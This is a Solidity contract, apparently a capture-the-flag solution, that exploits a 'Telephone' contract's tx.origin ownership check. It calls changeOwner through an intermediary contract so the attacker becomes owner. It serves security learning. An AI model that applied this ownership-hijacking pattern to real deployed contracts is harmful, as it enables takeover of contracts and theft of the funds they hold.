// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Telephone} from "./Telephone.sol";

contract AttackTelephone {
    Telephone private immutable i_telephone;

    constructor(address _telephoneAddress) {
        i_telephone = Telephone(_telephoneAddress);
    }

    // @notice should change the owner on the telephone contract
    // since the tx.origin will be different (EOA)
    function attack() external {
        i_telephone.changeOwner(msg.sender);
    }
}